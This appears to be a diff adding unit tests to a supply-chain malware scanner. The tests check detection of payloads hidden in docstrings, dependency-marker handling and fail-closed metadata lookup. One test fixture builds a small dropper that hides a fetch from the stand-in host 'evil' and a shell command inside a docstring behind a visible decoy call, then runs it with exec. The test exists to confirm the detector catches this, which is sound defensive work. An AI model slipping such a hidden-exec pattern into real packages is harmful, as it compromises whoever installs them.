@@ -429,6 +429,24 @@ def test_real_code_network_and_subprocess_not_hidden_combo():
     assert not any("hidden network+exec payload" in f.check for f in findings)
 
 
+def test_hidden_payload_survives_visible_decoy():
+    # A benign visible network call must not mask a docstring payload: the
+    # detector inspects the removed (blanked) span, not the whole stripped file.
+    payload = (
+        "import urllib.request, os\n"
+        "urllib.request.urlopen('http://evil/x').read()\n"
+        "os.system('sh -c id')\n"
+    )
+    src = (
+        '"""' + payload + '"""\n'
+        "import urllib.request\n"
+        "urllib.request.urlopen('http://benign/ok')\n"  # visible decoy
+        "exec(__doc__)\n"
+    )
+    findings = sp.check_py_file(src, "pkg/dropper.py", "pkg")
+    assert any("hidden network+exec payload" in f.check for f in findings)
+
+
 def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
     bl = tmp_path / "bl.json"
     listed = _mk(sp.CRITICAL, "fastapi", "fastapi/routing.py", "C2 polling/beaconing loop detected")
@@ -564,6 +582,19 @@ def test_marker_holds_by_default():
     assert sp._marker_holds_by_default("python_version >= '3.8' or extra == 'dev'") is True
     # No marker / plain env marker -> kept.
     assert sp._marker_holds_by_default("") is True
+    # Platform/python markers are kept: the scanner runs on one target but the
+    # package may install on another, so these deps must still be scanned.
+    assert sp._marker_holds_by_default("sys_platform == 'win32'") is True
+    assert sp._marker_holds_by_default("python_version == '3.13'") is True
+    assert sp._marker_holds_by_default("sys_platform == 'win32' and extra == 'gpu'") is True
+
+
+def test_requires_dist_for_fails_closed_on_missing_pin_metadata(monkeypatch):
+    # The pinned release's own metadata cannot be fetched -> recover nothing
+    # rather than substituting the latest release's (wrong) dependency tree.
+    project = _meta([], requires = ["latestdep==9.9.9"])
+    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
+    assert sp._requires_dist_for("oldpkg", "1.0.0", project) == []
 
 
 def test_requires_dist_for_uses_pinned_release(monkeypatch):
